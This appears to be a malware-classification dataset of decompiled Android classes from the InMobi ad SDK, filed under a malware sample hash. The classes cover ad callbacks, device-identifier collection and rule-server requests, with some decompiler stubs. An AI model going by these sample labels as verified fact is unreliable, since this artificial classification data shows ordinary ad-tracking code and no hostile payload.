"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.uid\UIDUtil.code","public class UIDUtil {   private static Random a=new Random();   public static Map<String,String> getMap(  Context context,  UID uid){     Map<String,String> uid2=getUid(uid);     String packageName=context.getPackageName();     String str="""";     try {       str=Integer.valueOf(context.getPackageManager().getPackageInfo(packageName,0).versionCode).toString();     }  catch (    PackageManager.NameNotFoundException e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to get app version"",e);     }     uid2.put(""u-appbid"",packageName);     uid2.put(""u-appver"",str);     String appId=InMobi.getAppId();     if (appId == null) {       appId="""";     }     uid2.put(""mk-siteid"",appId);     uid2.put(""mk-version"",""pr-SAND-"" + InternalSDKUtil.getInMobiInternalVersion(""4.1.1"") + ""-""+ InternalSDKUtil.INMOBI_SDK_RELEASE_DATE);     uid2.put(""ua"",InternalSDKUtil.getSavedUserAgent());     return uid2;   }   public static Map<String,String> getUid(  UID uid){     HashMap hashMap=new HashMap();     String num=Integer.toString(a.nextInt());     hashMap.put(AdTrackerConstants.UIDKEY,num);     hashMap.put(AdTrackerConstants.UKEYVER,UIDHelper.getRSAKeyVersion());     if (uid == null) {       hashMap.put(AdTrackerConstants.UIDMAP,UID.getCommonsUid().getDefaultUidMap(1,num,null));     }  else {       hashMap.put(AdTrackerConstants.UIDMAP,uid.getUidMap(1,num,null));     }     return hashMap;   }   public static String getEncryptedUid(  String str){     return UID.getCommonsUid().getDefaultUidMap(1,str,null);   }   public static void bindToJSON(  Map<String,String> map,  JSONObject jSONObject){     for (    String str : map.keySet()) {       try {         jSONObject.put(str,map.get(str));       }  catch (      JSONException e) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""UIDUtil: Unable to bind to JSON for key "" + str);       }     }   }   public static void bindToConnection(  Map<String,String> map,  URLConnection uRLConnection){     for (    String str : map.keySet()) {       uRLConnection.addRequestProperty(str,map.get(str));     }   }   public static String bindToGetParam(  Map<String,String> map){     StringBuilder sb=new StringBuilder();     for (    String str : map.keySet()) {       if (sb.length() > 0) {         sb.append(""&"");       }       sb.append(String.format(""%s=%s"",a(str),a(map.get(str))));     }     return sb.toString();   }   static String a(  String str){     if (str == null) {       return """";     }     try {       return URLEncoder.encode(str,""UTF-8"");     }  catch (    UnsupportedEncodingException e) {       throw new UnsupportedOperationException(e);     }   }   public static String getEncryptedJSON(  Map<String,String> map){     JSONObject jSONObject=new JSONObject();     bindToJSON(map,jSONObject);     return UIDHelper.encryptRSA(jSONObject.toString());   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\a.code","public class a implements INativeAdListener {   final IMNative a;   public a(  IMNative iMNative){     this.a=iMNative;   }   @Override public void onNativeRequestSucceeded(  IMNative iMNative){     String str;     Handler handler;     try {       this.a.a(IMNative.a.READY);       IMNative iMNative2=this.a;       str=iMNative.b;       iMNative2.b=str;       this.a.c=iMNative.c;       this.a.d=iMNative.d;       this.a.i=true;       handler=this.a.g;       handler.post(new b());     }  catch (    Exception e) {       Log.debug(Constants.LOG_TAG,""Failed to give callback"");     }   } class b implements Runnable {     b(){     }     @Override public void run(){       IMNativeListener iMNativeListener;       IMNativeListener iMNativeListener2;       try {         iMNativeListener=a.this.a.f;         if (iMNativeListener != null) {           iMNativeListener2=a.this.a.f;           iMNativeListener2.onNativeRequestSucceeded(a.this.a);         }       }  catch (      Exception e) {         e.printStackTrace();         Log.debug(Constants.LOG_TAG,""Failed to give callback"");       }     }   } class RunnableC0023a implements Runnable {     final IMErrorCode a;     RunnableC0023a(    IMErrorCode iMErrorCode){       this.a=iMErrorCode;     }     @Override public void run(){       IMNativeListener iMNativeListener;       IMNativeListener iMNativeListener2;       iMNativeListener=a.this.a.f;       if (iMNativeListener != null) {         iMNativeListener2=a.this.a.f;         iMNativeListener2.onNativeRequestFailed(this.a);       }     }   }   @Override public void onNativeRequestFailed(  IMErrorCode iMErrorCode){     Handler handler;     try {       this.a.a(IMNative.a.ERROR);       handler=this.a.g;       handler.post(new RunnableC0023a(iMErrorCode));     }  catch (    Exception e) {       Log.debug(Constants.LOG_TAG,""Failed to give callback"");     }   } } !org.eclipse.jdt.core.dom.TypeDeclaration@65f2d9d0"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\b.code","class b implements Runnable {   b(){   }   @Override public void run(){     IMNativeListener iMNativeListener;     IMNativeListener iMNativeListener2;     try {       iMNativeListener=a.this.a.f;       if (iMNativeListener != null) {         iMNativeListener2=a.this.a.f;         iMNativeListener2.onNativeRequestSucceeded(a.this.a);       }     }  catch (    Exception e) {       e.printStackTrace();       Log.debug(Constants.LOG_TAG,""Failed to give callback"");     }   } } public class b implements Runnable {   b(){   }   @Override public void run(){     if (IMBanner.this.k != null) {       IMBanner.this.k.onBannerRequestFailed(IMBanner.this,IMErrorCode.DO_MONETIZE);     }   } } public class b implements Runnable {   b(){   }   @Override public void run(){     if (IMInterstitial.this.e != null) {       IMInterstitial.this.e.onInterstitialFailed(IMInterstitial.this,IMErrorCode.NO_FILL);     }   } } class b implements Runnable {   final ViewGroup a;   b(  ViewGroup viewGroup){     this.a=viewGroup;   }   @Override public void run(){     try {       IMNative.this.a=new TrackerView(this.a.getContext(),IMNative.this.c,IMNative.this.d);       this.a.addView(IMNative.this.a);     }  catch (    Exception e) {       Log.e(Constants.LOG_TAG,""Failed to attach the view"");       IMNative.this.a(a.ERROR);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\c.code","public class c implements Runnable {   c(){   }   @Override public void run(){     if (IMBanner.this.k != null) {       IMBanner.this.k.onBannerRequestFailed(IMBanner.this,IMErrorCode.DO_NOTHING);     }   } } public class c implements Runnable {   c(){   }   @Override public void run(){     IMInterstitial.this.i.set(false);     IMInterstitial.this.j=State.INIT;     if (IMInterstitial.this.e != null) {       IMInterstitial.this.e.onInterstitialFailed(IMInterstitial.this,IMErrorCode.DO_NOTHING);     }   } } public class c implements Runnable {   c(){   }   @Override public void run(){     try {       if (IMNative.this.a != null) {         IMNative.this.a.destroy();         IMNative.this.a=null;       }  else {         Log.e(Constants.LOG_TAG,""Please attach the native ad view before calling detach"");         IMNative.this.a(a.ERROR);       }     }  catch (    Exception e) {       IMNative.this.a(a.ERROR);       com.inmobi.commons.internal.Log.debug(Constants.LOG_TAG,""Failed to detach a view"");     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\d.code","public class d implements Runnable {   final IMErrorCode a;   d(  IMErrorCode iMErrorCode){     this.a=iMErrorCode;   }   @Override public void run(){     if (IMBanner.this.k != null) {       IMBanner.this.k.onBannerRequestFailed(IMBanner.this,this.a);     }   } } public class d implements Runnable {   d(){   }   @Override public void run(){     IMInterstitial.this.i.set(false);     IMInterstitial.this.j=State.INIT;     if (IMInterstitial.this.e != null) {       IMInterstitial.this.e.onInterstitialFailed(IMInterstitial.this,IMErrorCode.DO_MONETIZE);     }   } } class d implements Runnable {   final HashMap a;   d(  HashMap hashMap){     this.a=hashMap;   }   @Override public void run(){     try {       IMNative.this.a.click(this.a);     }  catch (    Exception e) {       com.inmobi.commons.internal.Log.debug(Constants.LOG_TAG,""Failed to track click"");     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\e.code","public class e implements Runnable {   e(){   }   @Override public void run(){     Log.debug(ConfigConstants.LOGGING_TAG,""AppId Not Set - Please call setAppId on the IMBanner object with a valid appId. For XML, please add \""appId\"" attribute to the XML. Please refer integration guideline for more details."");     if (IMBanner.this.k != null) {       IMBanner.this.k.onBannerRequestFailed(IMBanner.this,IMErrorCode.INVALID_REQUEST);     }     IMBanner.this.h();   } } public class e implements InterstitialViewListener {   e(){   }   @Override public void onShowAdScreen(  InterstitialView interstitialView){     IMInterstitial.this.j=State.ACTIVE;     if (IMInterstitial.this.e != null) {       IMInterstitial.this.e.onShowInterstitialScreen(IMInterstitial.this);     }   }   @Override public void onLeaveApplication(  InterstitialView interstitialView){     if (IMInterstitial.this.e != null) {       IMInterstitial.this.e.onLeaveApplication(IMInterstitial.this);     }   }   @Override public void onInterstitialInteraction(  InterstitialView interstitialView,  Map<String,String> map){     if (IMInterstitial.this.e != null) {       IMInterstitial.this.e.onInterstitialInteraction(IMInterstitial.this,map);     }   }   @Override public void onDismissAdScreen(  InterstitialView interstitialView){     IMInterstitial.this.j=State.INIT;     if (IMInterstitial.this.e != null) {       IMInterstitial.this.e.onDismissInterstitialScreen(IMInterstitial.this);     }   }   @Override public void onAdRequestLoaded(  InterstitialView interstitialView){     IMInterstitial.this.j=State.READY;     IMInterstitial.this.i.set(false);     if (IMInterstitial.this.e != null) {       IMInterstitial.this.e.onInterstitialLoaded(IMInterstitial.this);     }   }   @Override public void onAdRequestFailed(  InterstitialView interstitialView,  AdRequest.ErrorCode errorCode){     if (IMInterstitial.this.b == LtvpRuleProcessor.ActionsRule.ACTIONS_TO_MEDIATION) {       if (IMInterstitial.this.e != null) {         IMInterstitial.this.e.onInterstitialFailed(IMInterstitial.this,IMErrorCode.DO_MONETIZE);       }     }  else     if (IMInterstitial.this.e != null) {       IMInterstitial.this.e.onInterstitialFailed(IMInterstitial.this,MonetizationUtils.getErrorCode(errorCode));     }     IMInterstitial.this.i.set(false);     IMInterstitial.this.j=State.INIT;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\f.code","class f implements Runnable {   f(){   }   @Override public void run(){     Log.debug(ConfigConstants.LOGGING_TAG,""AppId cannot be set to null"");     if (IMInterstitial.this.e != null) {       IMInterstitial.this.e.onInterstitialFailed(IMInterstitial.this,IMErrorCode.INVALID_REQUEST);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\g.code","public class g implements Runnable {   g(){   }   @Override public void run(){     if (IMBanner.this.k != null) {       IMBanner.this.k.onBannerRequestFailed(IMBanner.this,IMErrorCode.NO_FILL);     }   } } class g implements Runnable {   final IMErrorCode a;   g(  IMErrorCode iMErrorCode){     this.a=iMErrorCode;   }   @Override public void run(){     if (IMInterstitial.this.e != null) {       IMInterstitial.this.e.onInterstitialFailed(IMInterstitial.this,this.a);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\h.code","public class h implements BannerViewListener {   h(){   }   @Override public void onShowAdScreen(  BannerView bannerView){     IMBanner.this.l.set(true);     if (IMBanner.this.k != null) {       IMBanner.this.k.onShowBannerScreen(IMBanner.this);     }   }   @Override public void onLeaveApplication(  BannerView bannerView){     if (IMBanner.this.k != null) {       IMBanner.this.k.onLeaveApplication(IMBanner.this);     }   }   @Override public void onDismissAdScreen(  BannerView bannerView){     IMBanner.this.l.set(false);     IMBanner.this.h();     if (IMBanner.this.k != null) {       IMBanner.this.k.onDismissBannerScreen(IMBanner.this);     }   }   @Override public void onBannerInteraction(  BannerView bannerView,  Map<String,String> map){     if (IMBanner.this.k != null) {       IMBanner.this.k.onBannerInteraction(IMBanner.this,map);     }   }   @Override public void onAdRequestFailed(  BannerView bannerView,  AdRequest.ErrorCode errorCode){     if (IMBanner.this.b == LtvpRuleProcessor.ActionsRule.ACTIONS_TO_MEDIATION) {       if (IMBanner.this.k != null) {         IMBanner.this.k.onBannerRequestFailed(IMBanner.this,IMErrorCode.DO_MONETIZE);       }     }  else     if (IMBanner.this.k != null) {       IMBanner.this.k.onBannerRequestFailed(IMBanner.this,MonetizationUtils.getErrorCode(errorCode));     }     IMBanner.this.i.set(false);     IMBanner.this.h();   }   @Override public void onAdRequestCompleted(  BannerView bannerView){     IMBanner.this.i.set(false);     IMBanner.this.h();     if (IMBanner.this.k != null) {       IMBanner.this.k.onBannerRequestSucceeded(IMBanner.this);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\IMBanner.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3645c150"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\IMBannerListener.code","public interface IMBannerListener {   void onBannerInteraction(  IMBanner iMBanner,  Map<String,String> map);   void onBannerRequestFailed(  IMBanner iMBanner,  IMErrorCode iMErrorCode);   void onBannerRequestSucceeded(  IMBanner iMBanner);   void onDismissBannerScreen(  IMBanner iMBanner);   void onLeaveApplication(  IMBanner iMBanner);   void onShowBannerScreen(  IMBanner iMBanner); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\IMInterstitial.code","!org.eclipse.jdt.core.dom.TypeDeclaration@39cedcbb"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\IMInterstitialListener.code","public interface IMInterstitialListener {   void onDismissInterstitialScreen(  IMInterstitial iMInterstitial);   void onInterstitialFailed(  IMInterstitial iMInterstitial,  IMErrorCode iMErrorCode);   void onInterstitialInteraction(  IMInterstitial iMInterstitial,  Map<String,String> map);   void onInterstitialLoaded(  IMInterstitial iMInterstitial);   void onLeaveApplication(  IMInterstitial iMInterstitial);   void onShowInterstitialScreen(  IMInterstitial iMInterstitial); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\IMNative.code","public class IMNative {   TrackerView a;   private String b;   private String c;   private String d;   private String e;   private IMNativeListener f;   private Handler g;   private NativeAdRequest h;   private boolean i;   private a j;   private INativeAdListener k;   public enum a {  INIT,   LOADING,   READY,   ATTACHED,   DETACHED,   ERROR,   UNKNOWN}   public IMNative(  String str,  String str2,  String str3){     this.b=null;     this.c=null;     this.d=null;     this.a=null;     this.e=null;     this.f=null;     this.h=null;     this.i=false;     this.j=a.UNKNOWN;     this.k=new com.inmobi.monetization.a(this);     this.b=str;     this.c=str2;     this.d=str3;   }   public IMNative(  String str,  IMNativeListener iMNativeListener){     this.b=null;     this.c=null;     this.d=null;     this.a=null;     this.e=null;     this.f=null;     this.h=null;     this.i=false;     this.j=a.UNKNOWN;     this.k=new com.inmobi.monetization.a(this);     if (str == null || """".equals(str.trim())) {       Log.e(Constants.LOG_TAG,""Please create an instance of native ad with valid appId"");     }  else {       a(str,iMNativeListener);       a(a.INIT);     }   }   public IMNative(  IMNativeListener iMNativeListener){     this.b=null;     this.c=null;     this.d=null;     this.a=null;     this.e=null;     this.f=null;     this.h=null;     this.i=false;     this.j=a.UNKNOWN;     this.k=new com.inmobi.monetization.a(this);     a(InMobi.getAppId(),iMNativeListener);     a(a.INIT);   }   private void a(  String str,  IMNativeListener iMNativeListener){     if (!InternalSDKUtil.isInitializedSuccessfully()) {       Log.e(Constants.LOG_TAG,""Please initialize inmobi before requesting for native ads"");       return;     }     new NativeAd(null,null,null);     this.e=str.trim();     this.f=iMNativeListener;     this.h=new NativeAdRequest(this.e);     try {       this.g=new Handler();     }  catch (    Throwable th) {       Log.e(Constants.LOG_TAG,""Please create a native ad instance in the main thread"");     }   }   public void attachToView(  ViewGroup viewGroup){     try {       if (!InternalSDKUtil.isInitializedSuccessfully()) {         Log.e(Constants.LOG_TAG,""Please initialize inmobi before requesting for native ads"");       }  else       if (!this.i) {         Log.e(Constants.LOG_TAG,""Please load a native ad before attach"");       }  else       if (viewGroup == null) {         Log.e(Constants.LOG_TAG,""Please pass a valid view to attach"");       }  else       if (a() == a.ATTACHED) {         com.inmobi.commons.internal.Log.debug(Constants.LOG_TAG,""Ad is already attached"");       }  else       if (a() == a.READY) {         if (this.g == null) {           Log.e(Constants.LOG_TAG,""Please create a native ad instance in the main thread"");         }  else {           this.g.post(new b(viewGroup));           a(a.ATTACHED);         }       }  else {         Log.e(Constants.LOG_TAG,""Cannot attach an ad which is not ready or detached from view"");       }     }  catch (    Exception e) {       Log.e(Constants.LOG_TAG,""Please pass a valid view to attach"");     }   } class b implements Runnable {     final ViewGroup a;     b(    ViewGroup viewGroup){       this.a=viewGroup;     }     @Override public void run(){       try {         IMNative.this.a=new TrackerView(this.a.getContext(),IMNative.this.c,IMNative.this.d);         this.a.addView(IMNative.this.a);       }  catch (      Exception e) {         Log.e(Constants.LOG_TAG,""Failed to attach the view"");         IMNative.this.a(a.ERROR);       }     }   }   public void detachFromView(){     if (!InternalSDKUtil.isInitializedSuccessfully()) {       Log.e(Constants.LOG_TAG,""Please initialize inmobi before requesting for native ads"");       return;     }     if (!this.i) {       Log.e(Constants.LOG_TAG,""Please load a native ad before detach"");       return;     }     if (a() == a.ATTACHED) {       if (this.g == null) {         Log.e(Constants.LOG_TAG,""Please create a native ad instance in the main thread"");         return;       }       this.g.post(new c());       this.i=false;       a(a.DETACHED);       return;     }     com.inmobi.commons.internal.Log.debug(Constants.LOG_TAG,""Please attach the native ad view before calling detach"");   } public class c implements Runnable {     c(){     }     @Override public void run(){       try {         if (IMNative.this.a != null) {           IMNative.this.a.destroy();           IMNative.this.a=null;         }  else {           Log.e(Constants.LOG_TAG,""Please attach the native ad view before calling detach"");           IMNative.this.a(a.ERROR);         }       }  catch (      Exception e) {         IMNative.this.a(a.ERROR);         com.inmobi.commons.internal.Log.debug(Constants.LOG_TAG,""Failed to detach a view"");       }     }   }   public void handleClick(  HashMap<String,String> hashMap){     if (!InternalSDKUtil.isInitializedSuccessfully()) {       Log.e(Constants.LOG_TAG,""Please initialize inmobi before requesting for native ads"");       return;     }     if (!this.i) {       Log.e(Constants.LOG_TAG,""Cannot handle click, native ad not loaded or detached from view"");       return;     }     if (a() == a.ATTACHED) {       if (this.g == null) {         Log.e(Constants.LOG_TAG,""Please create a native ad instance in the main thread"");         return;       }  else {         this.g.post(new d(hashMap));         return;       }     }     com.inmobi.commons.internal.Log.debug(Constants.LOG_TAG,""Please attach to view before handling any events"");   } class d implements Runnable {     final HashMap a;     d(    HashMap hashMap){       this.a=hashMap;     }     @Override public void run(){       try {         IMNative.this.a.click(this.a);       }  catch (      Exception e) {         com.inmobi.commons.internal.Log.debug(Constants.LOG_TAG,""Failed to track click"");       }     }   }   public String getContent(){     return this.b;   }   public void loadAd(){     if (!InternalSDKUtil.isInitializedSuccessfully()) {       Log.e(Constants.LOG_TAG,""Please initialize inmobi before requesting for native ads"");       return;     }     if (this.e != null && !"""".equals(this.e)) {       if (this.g == null) {         Log.e(Constants.LOG_TAG,""Please create a native ad instance in the main thread"");         return;       }       if (a() == a.INIT) {         com.inmobi.commons.internal.Log.debug(Constants.LOG_TAG,""Loading Native Ad"");         a(a.LOADING);         NativeAdsController.getInstance().getAd(this.e,this.h,this.k);       }  else {         if (a() == a.LOADING) {           Log.e(Constants.LOG_TAG,""Ad is already loading. Please wait"");           return;         }         if (a() != a.UNKNOWN) {           com.inmobi.commons.internal.Log.debug(Constants.LOG_TAG,""Loading native ad"");           if (a() == a.ATTACHED) {             detachFromView();           }           this.b=null;           this.c=null;           this.d=null;           a(a.LOADING);           NativeAdsController.getInstance().getAd(this.e,this.h,this.k);         }       }     }   }   public synchronized void a(  a aVar){     this.j=aVar;   }   private synchronized a a(){     return this.j;   }   public void setRefTagParam(  String str,  String str2){     if (str == null || """".equals(str.trim())) {       com.inmobi.commons.internal.Log.debug(ConfigConstants.LOGGING_TAG,""Ref tag key cannot be null or blank."");     }  else     if (str2 == null || """".equals(str2.trim())) {       com.inmobi.commons.internal.Log.debug(ConfigConstants.LOGGING_TAG,""RefTag value cannot be null or blank."");     }  else {       this.h.setRefTagParam(str,str2);     }   }   public void setKeywords(  String str){     if (str == null || """".equals(str.trim())) {       com.inmobi.commons.internal.Log.debug(ConfigConstants.LOGGING_TAG,""Keywords cannot be null or blank."");     }  else {       this.h.setKeywords(str);     }   }   public void setRequestParams(  Map<String,String> map){     if (map == null || map.isEmpty()) {       com.inmobi.commons.internal.Log.debug(ConfigConstants.LOGGING_TAG,""Request params cannot be null or empty."");     }  else {       this.h.setRequestParams(map);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\IMNativeListener.code","public interface IMNativeListener {   void onNativeRequestFailed(  IMErrorCode iMErrorCode);   void onNativeRequestSucceeded(  IMNative iMNative); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization\RunnableC0023a.code","class RunnableC0023a implements Runnable {   final IMErrorCode a;   RunnableC0023a(  IMErrorCode iMErrorCode){     this.a=iMErrorCode;   }   @Override public void run(){     IMNativeListener iMNativeListener;     IMNativeListener iMNativeListener2;     iMNativeListener=a.this.a.f;     if (iMNativeListener != null) {       iMNativeListener2=a.this.a.f;       iMNativeListener2.onNativeRequestFailed(this.a);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\a.code","public class a extends WebViewClient {   final TrackerView a;   public a(  TrackerView trackerView){     this.a=trackerView;   }   @Override public void onPageFinished(  WebView webView,  String str){     ArrayList arrayList;     ArrayList arrayList2;     ArrayList arrayList3;     ArrayList arrayList4;     ArrayList arrayList5;     Log.internal(Constants.LOG_TAG,""Native ad context code loaded"");     this.a.f=true;     arrayList=this.a.e;     if (arrayList != null) {       arrayList2=this.a.e;       if (!arrayList2.isEmpty()) {         int i=0;         while (true) {           int i2=i;           arrayList3=this.a.e;           if (i2 >= arrayList3.size()) {             arrayList4=this.a.e;             arrayList4.clear();             this.a.e=null;             return;           }  else {             TrackerView trackerView=this.a;             arrayList5=this.a.e;             trackerView.injectJavaScript((String)arrayList5.get(i2));             i=i2 + 1;           }         }       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\Constants.code","public class Constants {   public static final String DUPLICATE_AD_REQUEST=""Banner Ad request failed : Duplicate request"";   public static final String DUPLICATE_AD_REQUEST_SLOT=""Ad request failed : Duplicate request for slot : "";   public static final String EMPTY_SLOTID=""Slot Id cannot be empty"";   public static final int HTTP_TIMEOUT=15000;   public static final String INVALID_INTERSTITIAL_STATE=""Interstitial Ad request failed : Invalid state"";   public static final String LOG_TAG=""[InMobi]-[Monetization]"";   public static String MEDIATION_RULE_SERVER=""http://apt.md.inmobi.net/ruleserver/RuleService"";   public static final String MEDIATION_SDK_VERSION=""4.1.1"";   public static final String NULL_ACTIVITY=""Activity cannot be null"";   public static final String NULL_SLOTID=""Slot Id cannot be null"";   public static final String OVERLAY_AD=""Ad request failed : Overlay Ad present""; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\GetLtvpRuleRequestTask.code","public class GetLtvpRuleRequestTask implements Runnable {   private GetLtvpRulesRequest a;   private IGetLtvpRuleRequestListener b;   private final int c=60000;   private final int d=-1;   public GetLtvpRuleRequestTask(  GetLtvpRulesRequest getLtvpRulesRequest,  IGetLtvpRuleRequestListener iGetLtvpRuleRequestListener){     this.a=getLtvpRulesRequest;     this.b=iGetLtvpRuleRequestListener;   }   @Override public void run(){     try {       URL url=new URL(AnalyticsInitializer.getConfigParams().getEndPoints().getRulesUrl());       DefaultHttpClient defaultHttpClient=new DefaultHttpClient();       String str=url + ""?"" + this.a.getEncodedRequestParams();       Log.debug(Constants.LOG_TAG,""Getting LTVP rule: "" + str);       HttpGet httpGet=new HttpGet(str);       BasicHttpParams basicHttpParams=new BasicHttpParams();       HttpConnectionParams.setConnectionTimeout(basicHttpParams,60000);       HttpConnectionParams.setSoTimeout(basicHttpParams,60000);       defaultHttpClient.setParams(basicHttpParams);       HttpResponse execute=defaultHttpClient.execute(httpGet);       if (execute.getStatusLine().getStatusCode() == 200) {         JSONObject jSONObject=new JSONObject(EntityUtils.toString(execute.getEntity()));         if (!jSONObject.getBoolean(""success"")) {           int i=jSONObject.getInt(""error_code"");           String string=jSONObject.getString(""error_message"");           Log.debug(Constants.LOG_TAG,""Received LTVP rule fetch failure: "" + i + "" : ""+ string);           if (this.b != null) {             this.b.onLtvpGetRuleFailed(this.a,new LtvpErrorCode(i,string));             return;           }           return;         }         JSONObject jSONObject2=jSONObject.getJSONObject(""response"");         Log.debug(Constants.LOG_TAG,""Received LTVP rule fetch success: "" + jSONObject2.toString());         GetLtvpRulesResponse getLtvpRulesResponse=new GetLtvpRulesResponse();         String string2=jSONObject2.getString(""rule_id"");         long j=jSONObject2.getLong(AnalyticsSQLiteHelper.EVENT_LIST_TS);         JSONObject jSONObject3=jSONObject2.getJSONObject(""exp"");         long j2=jSONObject3.getLong(""se"");         long j3=jSONObject3.getLong(""he"");         HashMap<String,Integer> hashMap=new HashMap<>();         JSONObject jSONObject4=jSONObject2.getJSONObject(""rules"");         Iterator<String> keys=jSONObject4.keys();         while (keys.hasNext()) {           String next=keys.next();           hashMap.put(next,Integer.valueOf(jSONObject4.getInt(String.valueOf(next))));         }         getLtvpRulesResponse.setRuleId(string2);         getLtvpRulesResponse.setTimeStamp(j);         getLtvpRulesResponse.setSoftExpiry(j2);         getLtvpRulesResponse.setHardExpiry(j3);         getLtvpRulesResponse.setRules(hashMap);         if (this.b != null) {           this.b.onLtvpGetRuleSucceeded(this.a,getLtvpRulesResponse);         }       }     }  catch (    Exception e) {       Log.debug(Constants.LOG_TAG,""Received LTVP rule fetch exception"",e);       if (this.b != null) {         this.b.onLtvpGetRuleFailed(this.a,new LtvpErrorCode(-1,""Ltvp rule server unreachable""));       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\GetLtvpRulesRequest.code","public class GetLtvpRulesRequest {   private String a;   private String b;   private String c;   private long d;   private String e;   private String f;   private String g;   public GetLtvpRulesRequest(){     try {       this.a=InMobi.getAppId();       this.b=""pr-SAND-"" + InternalSDKUtil.getInMobiInternalVersion(InMobi.getVersion()) + ""-""+ InternalSDKUtil.INMOBI_SDK_RELEASE_DATE;       this.d=new Random().nextInt();       this.c=UIDUtil.getEncryptedUid(Long.toString(this.d));       this.e=UIDHelper.getRSAKeyVersion();       this.f=InternalSDKUtil.getContext().getPackageName();       this.g=InternalSDKUtil.getContext().getPackageManager().getPackageInfo(this.f,0).versionName;     }  catch (    Exception e) {       Log.internal(Constants.LOG_TAG,""Failed to init Ltvp request"",e);     }   }   public String getEncodedRequestParams(){     try {       LinkedList linkedList=new LinkedList();       if (this.a != null && !"""".equals(this.a)) {         linkedList.add(new BasicNameValuePair(""mk-siteid"",this.a));       }       if (this.b != null && !"""".equals(this.b)) {         linkedList.add(new BasicNameValuePair(""mk-version"",this.b));       }       if (this.c != null && !"""".equals(this.c)) {         linkedList.add(new BasicNameValuePair(AdTrackerConstants.UIDMAP,this.c));       }       linkedList.add(new BasicNameValuePair(AdTrackerConstants.UIDKEY,Long.toString(this.d)));       if (this.e != null && !"""".equals(this.e)) {         linkedList.add(new BasicNameValuePair(AdTrackerConstants.UKEYVER,this.e));       }       if (this.f != null && !"""".equals(this.f)) {         linkedList.add(new BasicNameValuePair(""u-appbid"",this.f));       }       if (this.g != null && !"""".equals(this.g)) {         linkedList.add(new BasicNameValuePair(""u-appver"",this.g));       }       String locale=InternalSDKUtil.getContext().getResources().getConfiguration().locale.toString();       if (locale != null && !"""".equals(locale)) {         linkedList.add(new BasicNameValuePair(""d-localization"",locale));       }       linkedList.add(new BasicNameValuePair(AnalyticsSQLiteHelper.EVENT_LIST_TS,Long.toString(System.currentTimeMillis())));       return URLEncodedUtils.format(linkedList,""utf-8"");     }  catch (    Exception e) {       Log.internal(Constants.LOG_TAG,""Exception getting request params for ltvp get rules"",e);       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\GetLtvpRulesResponse.code","public class GetLtvpRulesResponse {   private String a;   private long b;   private HashMap<String,Integer> c;   private long d;   private long e;   public String getRuleId(){     return this.a;   }   public void setRuleId(  String str){     this.a=str;   }   public long getTimeStamp(){     return this.b;   }   public void setTimeStamp(  long j){     this.b=j;   }   public HashMap<String,Integer> getRules(){     return this.c;   }   public void setRules(  HashMap<String,Integer> hashMap){     this.c=hashMap;   }   public long getSoftExpiry(){     return this.d;   }   public void setSoftExpiry(  long j){     this.d=j;   }   public long getHardExpiry(){     return this.e;   }   public void setHardExpiry(  long j){     this.e=j;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\LtvpErrorCode.code","public class LtvpErrorCode {   int a;   String b;   public LtvpErrorCode(  int i,  String str){     this.a=i;     this.b=str;   }   public int getCode(){     return this.a;   }   public String getMessage(){     return this.b;   } } "
